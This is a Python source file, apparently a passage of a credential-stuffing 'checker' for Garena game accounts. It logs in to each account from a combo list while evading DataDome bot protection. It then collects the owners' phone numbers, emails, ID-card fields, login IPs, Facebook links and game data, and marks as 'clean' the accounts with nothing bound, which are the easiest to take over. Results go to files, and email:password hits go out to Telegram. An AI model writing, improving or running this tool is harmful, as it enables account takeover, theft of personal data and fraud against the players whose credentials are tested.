                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            
    except Exception:
        pass
    
    return has_codm, codm_info

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    
    game_mappings = {
        'tw': {
            "100082": "CODM",
            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE"
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE"
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR"
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV"
        }
    }

    try:
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        
        try:
            token_data = token_response.json()
            access_token = token_data.get("access_token", "")
        except json.JSONDecodeError:
            return ["No game connections found"]
        
        if not access_token:
            return ["No game connections found"]

        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        inspect_data = {"token": access_token}
        
        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            return ["No game connections found"]
        
        try:
            inspect_data = inspect_response.json()
        except json.JSONDecodeError:
            return ["No game connections found"]
            
        uac = inspect_data.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'
        
        if region == 'th' or region == 'in':
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"
        
        applicable_games = game_mappings.get(region, game_mappings['default'])
        detected_roles = {}
        found_games = []
        
        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Accept': "application/json, text/plain, */*",
                'Accept-Language': "en-US,en;q=0.5",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Connection': "keep-alive",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Sec-Fetch-Dest': "empty",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Site': "same-origin",
                'Cookie': f"session_key={session_key_roles}"
            }
            
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
                
                try:
                    roles_data = roles_response.json()
                except json.JSONDecodeError:
                    continue
                
                role = None
                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                    role = roles_data[app_id][0].get("role", None)
                
                if role:
                    detected_roles[app_id] = role
                    found_games.append(game_name)
                    game_info.append(f"{region.upper()} - {game_name} - {role}")
            
            except Exception:
                continue
        
        if not game_info:
            game_info.append(f"{region.upper()} - No Game Detected")
            
    except Exception:
        game_info.append("Error fetching game data")
    
    return game_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    mobile_no = user_info.get('mobile_no', 'N/A')
    country_code = user_info.get('country_code', '')
    
    if mobile_no != 'N/A' and mobile_no and country_code:
        formatted_mobile = f"+{country_code}{mobile_no}"
    else:
        formatted_mobile = mobile_no
    
    mobile_bound = bool(mobile_no and mobile_no != 'N/A' and mobile_no.strip())
    
    email = user_info.get('email', 'N/A')
    email_verified = bool(user_info.get('email_v', 0))
    email_actually_bound = bool(email != 'N/A' and email and email_verified)
    
    login_history = data.get('login_history', [])
    last_login_info = login_history[0] if login_history else {}
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime("%Y-%m-%d %H:%M", time.localtime(last_login)) if last_login else "N/A"
    last_login_where = last_login_info.get('source', 'Unknown')
    ipk = last_login_info.get('ip', 'N/A')
    ipc = last_login_info.get('country', 'N/A')
    
    fb_account = user_info.get('fb_account')
    if isinstance(fb_account, dict):
        fb_username = fb_account.get('fb_username', '')
        fb_uid = fb_account.get('fb_uid', '')
        fb_link = f"https://facebook.com/{fb_uid}" if fb_uid else "N/A"
    else:
        fb_username = fb_account if fb_account else "None"
        fb_link = f"https://facebook.com/{fb_account}" if fb_account else "N/A"
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email,
        'email_verified': email_verified,
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': fb_username,
            'suspicious': bool(user_info.get('suspicious', False))
        },
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': country_code,
            'mobile_no': formatted_mobile,
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'mobile_actually_bound': mobile_bound,
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        
        'last_login': {
            'date': last_login_date,
            'source': last_login_where,
            'ip': ipk,
            'country': ipc
        },
        
        'fb_info': {
            'username': fb_username,
            'link': fb_link
        },
        
        'binds': [],
        'game_info': []
    }

    if email_actually_bound:
        account_info['binds'].append('Email')
    
    if account_info['personal']['mobile_actually_bound']:
        account_info['binds'].append('Phone')
    
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    
    if account_info['personal']['id_card'] != 'N/A' and account_info['personal']['id_card']:
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("Suspicious")
    
    account_info['security_status'] = "Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def save_account_details(account, password, details, codm_info=None):
    try:
        if not os.path.exists('Results'):
            os.makedirs('Results')
        
        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'

        separator = "---------------------------------------------------\n"
        
        with open('valid_accounts.txt', 'a', encoding='utf-8') as f:
            f.write(f"account: {account} | name: {codm_name} | uid: {codm_uid} | region: {codm_region}\n")
        
        account_output = f"{separator}"
        account_output += f"-> Account: {account}\n"
        account_output += f"   -> Country: {details.get('personal', {}).get('country', 'N/A')}\n"
        account_output += f"   -> Garena Shells: {details.get('profile', {}).get('shell_balance', 'N/A')}\n"
        account_output += f"   -> Mobile: {details.get('personal', {}).get('mobile_no', 'None')}\n"
        
        email = details.get('email', 'None')
        email_verified = details.get('email_verified', False)
        if email != 'None':
            email_status = f"{email} ({'Verified' if email_verified else 'Not Verified'})"
            account_output += f"   -> Email: {email_status}\n"
        else:
            account_output += f"   -> Email: None\n"
            
        account_output += f"   -> FB Username: {details.get('fb_info', {}).get('username', 'N/A')}\n"
        account_output += f"   -> FB Link: {details.get('fb_info', {}).get('link', 'N/A')}\n"
        
        last_login = details.get('last_login', {})
        account_output += f"   -> Last Login: {last_login.get('date', 'N/A')}\n"
        account_output += f"   -> Login Source: {last_login.get('source', 'N/A')}\n"
        account_output += f"   -> IP: {last_login.get('ip', 'N/A')}\n"
        account_output += f"   -> IP Country: {last_login.get('country', 'N/A')}\n"
        
        account_output += f"-> Connected Games:\n"
        games = details.get('game_info', [])
        for game in games:
            account_output += f"   -> {game}\n"
        
        if codm_info:
            account_output += f"-> CODM Info:\n"
            account_output += f"    -> CODM Nickname: {codm_name}\n"
            account_output += f"    -> CODM Level: {codm_level}\n"
            account_output += f"    -> CODM UID: {codm_uid}\n"
            
        account_output += f"-> Security:\n"
        account_output += f"   -> Mobile Bound: {details.get('personal', {}).get('mobile_actually_bound', False)}\n"
        account_output += f"   -> Authenticator: {'Enabled' if details.get('security', {}).get('authenticator_app') else 'Disabled'}\n"
        account_output += f"   -> 2FA: {'Enabled' if details.get('security', {}).get('two_step_verify') else 'Disabled'}\n"
        account_output += f"   -> Account Status: {'Clean' if details.get('is_clean') else 'Not Clean'}\n"
        account_output += f"   -> Config By @poqruette\n"
        account_output += f"{separator}"
        
        if details['is_clean']:
            with open('Results/clean_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(account_output)
            
            if codm_info:
                with open('Results/clean_codm.txt', 'a', encoding='utf-8') as f:
                    f.write(account_output)
        else:
            with open('Results/notclean_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(account_output)
            
            if codm_info:
                with open('Results/notclean_codm.txt', 'a', encoding='utf-8') as f:
                    f.write(account_output)
        
        if codm_info:
            with open('Results/codm_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(account_output)
        else:
            with open('Results/valid_no_codm.txt', 'a', encoding='utf-8') as f:
                f.write(account_output)
        
        with open('Results/full_details.txt', 'a', encoding='utf-8') as f:
            f.write(account_output)
            
    except Exception:
        pass

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, count=0):
    global BATCH_COUNT
    BATCH_COUNT += 1
    
    try:
        datadome_manager.clear_session_datadome(session)
        
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                live_stats.update_stats(valid=False)
                return format_account_output(account, "error_datadome_failed", count=BATCH_COUNT)
            datadome_manager.set_datadome(datadome)
            datadome_manager.set_session_datadome(session, datadome)
        
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        
        if v1 == "IP_BLOCKED":
            return format_account_output(account, "error_ip_blocked", count=BATCH_COUNT)
        
        if not v1 or not v2:
            if v1 is None and v2 is None:
                live_stats.update_stats(valid=False)
                return format_account_output(account, "error_no_account", count=BATCH_COUNT)
            live_stats.update_stats(valid=False)
            return format_account_output(account, "error_prelogin_failed", count=BATCH_COUNT)
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return format_account_output(account, "error_auth", count=BATCH_COUNT)
        
        try:
            session.cookies.set('sso_key', sso_key, domain='.garena.com')
        except Exception:
            pass
        
        headers = {
            'accept': '*/*',
            'cookie': f'sso_key={sso_key}',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return format_account_output(account, "error_ip_blocked", count=BATCH_COUNT)
            live_stats.update_stats(valid=False)
            return format_account_output(account, "error_banned", count=BATCH_COUNT)
            
        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            return format_account_output(account, "error_invalid_response", count=BATCH_COUNT)
        
        if 'error' in account_data:
            if account_data.get('error') == 'error_auth':
                live_stats.update_stats(valid=False)
                return format_account_output(account, "error_auth", count=BATCH_COUNT)
            live_stats.update_stats(valid=False)
            return format_account_output(account, f"error_{account_data['error']}", count=BATCH_COUNT)
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        game_info = get_game_connections(session, account)
        details['game_info'] = game_info
        
        has_codm, codm_info = check_codm_account(session, account)
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
            print(format_cookie_message(BATCH_COUNT, fresh_datadome), flush=True)
        
        save_account_details(account, password, details, codm_info if has_codm else None)
        
        if has_codm and codm_info:
            account_data = {
                'account': f"{account}:{password}",
                'shells': details.get('profile', {}).get('shell_balance', 'N/A'),
                'codm_level': codm_info.get('codm_level', 0),
                'codm_info': {
                    'region': codm_info.get('region', 'N/A'),
                    'nickname': codm_info.get('codm_nickname', 'N/A'),
                    'level': codm_info.get('codm_level', 'N/A'),
                    'uid': codm_info.get('uid', 'N/A'),
                    'country': details.get('personal', {}).get('country', 'N/A')
                },
                'security': {
                    'mobile': "True" if details.get('personal', {}).get('mobile_actually_bound') else "False",
                    'email': f"{details.get('email', 'None')} ({'Verified' if details.get('email_verified') else 'Not Verified'})"
                },
                'facebook': {
                    'username': details.get('fb_info', {}).get('username', 'N/A'),
                    'link': details.get('fb_info', {}).get('link', 'N/A')
                }
            }
            send_telegram_notification(account_data)
        
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
        
        output_details = {
            'country': details.get('personal', {}).get('country', 'N/A'),
            'shells': details.get('profile', {}).get('shell_balance', 'N/A'),
            'mobile': details.get('personal', {}).get('mobile_no', 'None'),
            'email': details.get('email', 'None'),
            'email_verified': details.get('email_verified', False),
            'fb_username': details.get('fb_info', {}).get('username', 'N/A'),
            'fb_link': details.get('fb_info', {}).get('link', 'N/A'),
            'last_login': details.get('last_login', {}),
            'game_info': details.get('game_info', []),
            'mobile_bound': details.get('personal', {}).get('mobile_actually_bound', False),
            'authenticator': "Enabled" if details.get('security', {}).get('authenticator_app') else "Disabled",
            'two_fa': "Enabled" if details.get('security', {}).get('two_step_verify') else "Disabled",
            'account_status': "Clean" if details.get('is_clean') else "Not Clean"
        }
        
        result = format_account_output(account, "success", output_details, codm_info if has_codm else None, BATCH_COUNT)
        
        return result
        
    except Exception as e:
        live_stats.update_stats(valid=False)
        error_output = format_account_output(account, f"error_processing", count=BATCH_COUNT)
        return error_output

def remove_checked_accounts(filename, accounts_to_remove):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            all_accounts = [line.strip() for line in file if line.strip()]
        
        remaining_accounts = [acc for acc in all_accounts if acc not in accounts_to_remove]
        
        with open(filename, 'w', encoding='utf-8') as file:
            for account in remaining_accounts:
                file.write(account + '\n')
        
    except Exception:
        pass

def main():
    if not device_main():
        sys.exit(1)

    if not _check_integrity():
        sys.exit(1)

    display_banner()
    
    load_telegram_config()
    
    setup_threads()
    
    if not TELEGRAM_ENABLED:
        setup_telegram()
    
    filename = input("Enter the filename containing accounts: ").strip()
    
    if not os.path.exists(filename):
        return
    
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    
    session = cloudscraper.create_scraper()
    
    initial_cookie = cookie_manager.get_valid_cookie()
    if initial_cookie:
        applyck(session, initial_cookie)
    else:
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
    
    with open(filename, 'r', encoding='utf-8') as file:
        accounts = [line.strip() for line in file if line.strip()]
    
    processed_accounts = []
    
    def signal_handler(sig, frame):
        print("\n\n" + "="*50)
        final_stats = live_stats.get_stats()
        print(f"{colorama.Fore.CYAN}[FINAL SUMMARY]{colorama.Style.RESET_ALL}")
        print(f"{colorama.Fore.GREEN}VALID: {final_stats['valid']}{colorama.Style.RESET_ALL} {colorama.Fore.RED}| INVALID: {final_stats['invalid']}{colorama.Style.RESET_ALL}")
        print(f"{colorama.Fore.GREEN}CLEAN: {final_stats['clean']}{colorama.Style.RESET_ALL} {colorama.Fore.YELLOW}| NOT CLEAN: {final_stats['not_clean']}{colorama.Style.RESET_ALL}")
        print(f"{colorama.Fore.BLUE}CODM: {final_stats['codm']}{colorama.Style.RESET_ALL} {colorama.Fore.MAGENTA}| NO CODM: {final_stats['no_codm']}{colorama.Style.RESET_ALL}")
        print(f"PROCESSED: {len(processed_accounts)}/{len(accounts)} accounts")
        
        if processed_accounts:
            remove_checked = input("\nRemove checked accounts from file? (y/n): ").strip().lower()
            if remove_checked == 'y':
                remove_checked_accounts(filename, processed_accounts)
        
        print("="*50)
        sys.exit(0)
    
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    
    for i, account_line in enumerate(accounts, 1):
        if ':' not in account_line:
            continue
            
        account, password = account_line.split(':', 1)
        account = account.strip()
        password = password.strip()
        
        print(f"{colorama.Fore.CYAN}[{i}/{len(accounts)}]{colorama.Fore.WHITE} Processing {account.split(':')[0] if ':' in account else account}...{colorama.Style.RESET_ALL}", flush=True)
        
        print(live_stats.display_stats(), flush=True)
        
        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
        print(result, flush=True)
        
        processed_accounts.append(account_line)
        
        time.sleep(1)
    
    final_stats = live_stats.get_stats()
    print(f"\n{colorama.Fore.CYAN}[FINAL STATS]{colorama.Fore.GREEN} VALID: {final_stats['valid']}{colorama.Style.RESET_ALL}{colorama.Fore.RED} | INVALID: {final_stats['invalid']}{colorama.Style.RESET_ALL}{colorama.Fore.GREEN} | CLEAN: {final_stats['clean']}{colorama.Style.RESET_ALL}{colorama.Fore.YELLOW} | NOT CLEAN: {final_stats['not_clean']}{colorama.Style.RESET_ALL}{colorama.Fore.BLUE} | CODM: {final_stats['codm']}{colorama.Style.RESET_ALL}{colorama.Fore.MAGENTA} | NO CODM: {final_stats['no_codm']}{colorama.Style.RESET_ALL}")
    
    remove_checked_accounts(filename, processed_accounts)

if __name__ == "__main__":
    main()